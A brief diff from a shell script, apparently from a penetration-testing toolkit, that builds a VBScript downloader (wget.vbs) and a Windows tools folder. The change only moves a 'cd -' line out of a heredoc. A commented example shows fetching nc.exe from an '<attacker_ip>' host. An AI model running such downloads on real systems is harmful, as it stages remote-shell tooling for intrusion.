@@ -233,8 +233,8 @@ cat <<\EOT >wget.vbs.bat
     echo ts.Close >> wget.vbs
 
     # cscript wget.vbs http://<attacker_ip>/nc.exe nc.exe
-cd -
 EOT
+cd -
 
 rm -rf public/tools_windows/bin
 mkdir -p public/tools_windows/bin
